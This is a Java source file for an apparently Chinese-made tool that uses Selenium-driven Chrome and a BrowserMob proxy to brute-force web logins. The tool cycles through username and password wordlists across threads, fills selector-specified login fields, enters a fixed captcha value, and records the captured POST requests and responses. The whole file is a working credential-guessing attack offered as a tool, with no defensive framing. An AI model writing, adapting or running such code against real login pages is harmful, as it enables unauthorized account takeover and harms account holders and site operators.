package sample;


import net.lightbody.bmp.BrowserMobProxy;
import net.lightbody.bmp.BrowserMobProxyServer;
import net.lightbody.bmp.client.ClientUtil;
import net.lightbody.bmp.core.har.Har;
import net.lightbody.bmp.core.har.HarEntry;
import net.lightbody.bmp.core.har.HarPostDataParam;
import net.lightbody.bmp.proxy.CaptureType;
import org.apache.poi.ss.usermodel.Cell;
import org.apache.poi.ss.usermodel.Row;
import org.apache.poi.ss.usermodel.Sheet;
import org.apache.poi.xssf.usermodel.XSSFWorkbook;
import org.openqa.selenium.*;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeOptions;

import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.util.List;
import java.util.Properties;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.regex.Pattern;

public class baopochrome implements Runnable {

    private String url;
    private String account;
    private String passwd;

    private String yanzgengma;
    private String yzmstr;
    private String denglukuang;

    private int threadnum;

    private int index;


    private String replace;


    public baopochrome(String url, String account, String passwd, String yanzgengma, String yzmstr, String denglukuang, int threadnum, int index, String replace) {
        this.account = account;
        this.passwd = passwd;
        this.url = url;
        this.denglukuang = denglukuang;
        this.yanzgengma = yanzgengma;
        this.yzmstr = yzmstr;
        this.threadnum = threadnum;
        this.index = index;
        this.replace = replace;
    }


    @Override
    public void run() {
        File path = getFilePath.getPath();
        String parent = path.getParent();

        System.setProperty("webdriver.chrome.driver", parent + "//Tools//chromedriver.exe");
        BrowserMobProxy browserMobProxy = new BrowserMobProxyServer();
        browserMobProxy.enableHarCaptureTypes(CaptureType.REQUEST_CONTENT, CaptureType.RESPONSE_CONTENT);
        browserMobProxy.setHarCaptureTypes(CaptureType.RESPONSE_CONTENT, CaptureType.REQUEST_CONTENT);
        browserMobProxy.setTrustAllServers(true);
        browserMobProxy.newHar("kk");
        browserMobProxy.start();


        Proxy proxy = ClientUtil.createSeleniumProxy(browserMobProxy);

        String httpProxy = proxy.getHttpProxy();
        String port = httpProxy.substring(httpProxy.indexOf(":"));

        System.out.println(httpProxy);

        proxy.setHttpProxy("127.0.0.1"+port);

        proxy.setSslProxy("127.0.0.1"+port);


                ChromeOptions options = new ChromeOptions().addArguments("--proxy-server=http://" + proxy.getHttpProxy(), "--incognito");
//        ChromeOptions options = new ChromeOptions();

//        options.setBinary(parent+"\\Tools\\chrome.exe");
        options.addArguments("--disable-extensions");
        options.addArguments("–disable-plugins");
        options.addArguments("--ignore-certificate-errors");

        if (!chromeoptions.openchrome) {
            // System.out.println("我执行了");
            options.addArguments("--headless");
        }

        options.addArguments("blink-settings=imagesEnabled=false");


        WebDriver driver = new ChromeDriver(options);


        int usersize = getAccount.user.size();
        int passsize = getAccount.password.size();

        int nums = usersize * passsize;


        int count = nums / threadnum;

        int num = 0;

        int i1 = count * (index) / passsize;
        int i2 = count * (index) % passsize;

        ExecutorService executorService = Executors.newSingleThreadExecutor();
        Thread thread = new Thread(() -> {

            Har har = browserMobProxy.getHar();
            har.getLog().getEntries().removeIf(x -> !x.getRequest().getMethod().equals("POST"));
            har.getLog().getEntries().removeIf(x -> Pattern.matches(".*google.*", x.getRequest().getUrl()));
            int finalHarsize = har.getLog().getEntries().size();

            if (finalHarsize != 0 && finalHarsize != 1) {
                List<HarEntry> entries = har.getLog().getEntries();

                String a = " ";
                List<HarPostDataParam> params = entries.get(finalHarsize - 2).getRequest().getPostData().getParams();
                for (HarPostDataParam param : params) {
//                    System.out.print(param.getValue() + "------");
                    a = a + param.getValue() + "------";
                }
//                System.out.println(entries.get(finalHarsize - 2).getResponse().getContent().getText());
                a = a + entries.get(finalHarsize - 2).getResponse().getContent().getText();
                System.out.println(a);
            }

        });

        if (chromeoptions.isxpath){
            try {

                ok:
                for (int j = i1; j < usersize; j++) {

                    if (j != i1) i2 = 0;
                    for (int k = i2; k < passsize; k++) {
                        driver.get(url);  //地址栏输入百度地址


                        driver.findElement(By.xpath(account)).sendKeys(getAccount.user.get(j));//搜索输入框输入Selenium

                        driver.findElement(By.xpath(passwd)).sendKeys(getAccount.password.get(k));//搜索输入框输入Selenium


                        driver.findElement(By.xpath(yanzgengma)).sendKeys(yzmstr);

                        driver.findElement(By.xpath(denglukuang)).click();//点击百度一下按钮

                        driver.manage().timeouts().implicitlyWait(400, TimeUnit.SECONDS);
                        executorService.execute(thread);

                        num++;

                        if (num == count) {
                            break ok;
                        }

                    }
                }
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        }else {
            try {

                ok:
                for (int j = i1; j < usersize; j++) {

                    if (j != i1) i2 = 0;
                    for (int k = i2; k < passsize; k++) {
                        driver.get(url);  //地址栏输入百度地址


                        driver.findElement(By.cssSelector(account)).sendKeys(getAccount.user.get(j));//搜索输入框输入Selenium

                        driver.findElement(By.cssSelector(passwd)).sendKeys(getAccount.password.get(k));//搜索输入框输入Selenium


                        driver.findElement(By.cssSelector(yanzgengma)).sendKeys(yzmstr);

                        driver.findElement(By.cssSelector(denglukuang)).click();//点击百度一下按钮

                        driver.manage().timeouts().implicitlyWait(400, TimeUnit.SECONDS);
                        executorService.execute(thread);

                        num++;

                        if (num == count) {
                            break ok;
                        }

                    }
                }
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        }



        driver.quit();

        Har har = browserMobProxy.getHar();
        har.getLog().getEntries().removeIf(x -> !x.getRequest().getMethod().equals("POST"));
        har.getLog().getEntries().removeIf(x -> Pattern.matches(".*google.*", x.getRequest().getUrl()));
        har.getLog().getEntries().removeIf(x -> Pattern.matches(".*googles.*", x.getRequest().getUrl()));



        List<HarEntry> entries = har.getLog().getEntries();

        synchronized (openchrome.class) {
            new outFile().addFile(entries, replace, parent);
        }

    }
}
